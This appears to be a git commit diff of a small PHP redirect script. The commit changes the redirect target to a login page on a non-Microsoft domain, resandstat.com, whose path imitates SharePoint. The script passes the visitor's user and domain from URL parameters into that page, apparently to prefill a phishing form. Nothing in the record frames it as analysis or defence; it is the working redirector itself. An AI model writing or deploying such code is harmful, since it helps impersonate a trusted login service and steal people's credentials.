7695287dc511ff9ac426926b525b3d5dcbbf1d0e
intbadboy <53456643+intbadboy@users.noreply.github.com>
2019-08-05 12:48:22 -0700

    Update index.php

--- index.php
+++ index.php
@@ -7,5 +7,5 @@ function Redirect($url, $permanent = false)
  }
  exit();
 }
-Redirect("https://share-point.azure.resandstat.com/auth/login.php?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
+Redirect("https://resandstat.com/share-point/auth/login.php?client_id=" . $_GET['1'] . "@" . $_GET['2']   . "", false);
 ?>
